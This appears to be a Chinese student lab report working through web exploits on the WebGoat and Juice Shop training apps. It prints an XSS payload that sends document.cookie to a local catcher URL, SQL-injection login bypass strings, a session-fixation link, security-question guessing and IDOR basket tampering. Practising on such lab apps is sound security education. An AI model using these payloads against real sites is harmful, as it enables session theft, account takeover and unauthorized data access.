# Web 应用漏洞攻防

## 一、实验目的

- 了解常见 Web 漏洞训练平台；
- 了解 常见 Web 漏洞的基本原理；
- 掌握 OWASP Top 10 及常见 Web 高危漏洞的漏洞检测、漏洞利用和漏洞修复方法；

## 二、实验环境

- WebGoat
- Juice Shop

## 三、实验要求

- 每个实验环境完成不少于 5 种不同漏洞类型的漏洞利用练习

## 四、实验过程

### （一）webgoat环境下的漏洞攻防

#### 搭建WebGoat环境

- 首先确定虚拟机中没有安装docker-compose

  ```
  apt polocy docker-compose
  ```

  ![image-20191224190528102](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224190528102.png)

- 更新apt并安装docker-compose，系统会自动安装最新版本的docker

  ```
  apt update && apt install docker-compose
  ```

![image-20191224190804417](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224190804417.png)

- 检查镜像

  ![image-20191224191958449](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224191958449.png)

- 克隆老师的仓库到本地

- 安装WebGoat环境

```
docker-compose up -d
```

-  查看三个镜像的健康状况，可以看到WebGoat-7.1对应虚拟机本地8087端口，WebGoat-8.0对应虚拟机本地8080端口

  ```
  docker ps
  ```

  ![image-20191224192645212](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224192645212.png)

访问WebGoat-7.1 不需要注册,访问WebGoat-8.0需要，按照提示步骤注册即可。

输入用户名、密码登录Webgoat页面来验证安装是否成功

- 浏览器添加插件ProxySwitchyOmega，设置proxy

![image-20191224193405513](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224193405513.png)

- 设置burpsuite的intercept is on，相当于设置断点，方便调试、转发

![image-20191224193529217](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224193529217.png)

#### 1、未验证的用户输入漏洞

- 浏览器添加插件ProxySwitchyOmega，设置proxy

在WebGoat-8.0提交表单

![image-20191224193951064](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224193951064.png)

直接forward时，表单无法提交

![image-20191224194040821](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224194040821.png)

使用开发者工具修改每一个表单项的内容，让它突破html中的表单填写限制，再次进行forward，即可成功提交

![image-20191224194414719](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224194414719.png)

![image-20191224194447511](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224194447511.png)

#### 2、XSS跨站脚本攻击

##### 实验环境：WebGoat 7.0.1 

##### 实验目的：

- 通过xss攻击获取受害者的cookie
- 把cookie以参数的形式发送到目标服务器中

查看页面cookie值

<script>alert(document.cookie)</script>
![image-20191224194955453](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224194955453.png)

![image-20191224195034961](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224195034961.png)

替换：

<script>window.open('http://127.0.0.1:8087/WebGoat/ catcher?PROPERTY=yes&msg='+document.cookie)</script>
此时弹出了一个网页，其URL为
 http://127.0.0.1:8087/WebGoat/catcher?PROPERTY=yes&msg=JSESSIONID=4DC9F3FCD8CD3215786AE469A89699F9
 此url中msg参数和之前弹窗弹出来的cookie相同

![image-20191224195220246](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224195220246.png)

#### 3、脆弱访问控制

##### 实验环境：WebGoat 7.0.1 

##### 普遍身份认证流程中常见的缺陷模式包括：简单易猜解的用户名和用户⼝令；由于第三方认证凭据泄漏导致的撞库攻击；存在缺陷的身份管理功能，例如口令修改、忘记口令 功能设计不当会导致所有用户口令可以被任意修改，进而被任意身份仿冒。

Forgot Password 忘记密码

- 原理：Web应用经常提供给用户密码找回功能，但是不幸的是有些措施很弱，证明自己是该用户的方式过于简单，会造成威胁
- 实验目的：通过类似穷举的方式突破身份证明问题，从而获取用户名密码

![image-20191224211407611](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224211407611.png)

![image-20191224211506516](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224211506516.png)

很快就猜出了密码是red。攻击成功。

![image-20191224211814010](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224211814010.png)

#### 4、脆弱认证和会话管理

##### 实验环境：WebGoat 7.0.1 

**原理**：常见的 Web 应用会话管理功能实现是依赖于客户端的 Cookie 和服务端的 Session  机制的。客户端 Cookie 中通常会记录服务端代码设置的一个随机长字符串作为 Session ID，服务端代码使用客户端发送来的 Cookie 中这个 Session ID 在服务端的 Session 列表中找到匹配 Session 对象，进而就可以知道用户是谁。这里的 Session ID， 一般称之为会话令牌。

- 伪造一个带有Session的链接发送给别人,在邮件内容后加&SID……

![image-20191224213336976](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224213336976.png)

- Janes收到这个邮件，点击链接并进行了登录

![image-20191224213531431](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224213531431.png)

- 此时只需要用刚刚发送的Session值,就可以直接进入别人的账户

![image-20191224214126513](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224214126513.png)

#### 5、SQL注入缺陷

##### 实验环境：WebGoat 7.0.1 

- 直接在登录界面用Burp suite拦截提交，修改password内容为 ' or '1'='1。

  ![image-20191224214357776](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224214357776.png)

- 成功绕过认证登录

![image-20191224214457148](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224214457148.png)

### （二）Juice shop环境下的漏洞攻防

##### 搭建juice shop环境

```
docker-compose up -d
```

![image-20191224214718732](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224214718732.png)

- 输入访问入口地址，进入JuiceShop环境界面

![image-20191224214809573](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224214809573.png)

- 找到计分板score-board，并访问对应网址

![image-20191224215006049](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224215006049.png)

#### 1、SQL注入缺陷

在用户名部分输入'or 1=1--，密码随意填写即可绕过登录。

![image-20191224215849278](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224215849278.png)

![image-20191224215911167](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224215911167.png)

#### 2、脆弱认证

通过忘记密码，更改用户密码

输入Bjoern的owasp账户，密保问题是问最喜欢的宠物。

![image-20191224220041667](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224220041667.png)

通过互联网信息搜索，发现他有一只猫叫'Zaya'，填入答案，即可进行密码重置。

![image-20191224220126883](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224220126883.png)

#### 3、敏感数据曝光/遗忘信息

在/#/about 页面中通过开发者工具找到【使用条款】的对应href=“/ftp/legal.md”。

根据左下角的路径访问ftp链接。

点开文件可以看到机密文件内容，实现了获取

![image-20191224220317209](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224220317209.png)

![image-20191224220353321](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224220353321.png)

- 点开文件可以看到机密文件内容，实现了获取。

![image-20191224220429095](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224220429095.png)

#### 4、脆弱访问控制

实验目的：查看另一个用户的购物车。

用burpsuite抓包，点添加购物车后，抓包发现链接上有个/rest/basket/8，修改此处的8为其他数字。即可把查看其他用户的购物车，还能把某样商品加到他人购物车

![image-20191224220921029](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224220921029.png)

将8改为6，即可查看他人的购物车

![image-20191224221021292](C:\Users\66459\AppData\Roaming\Typora\typora-user-images\image-20191224221021292.png)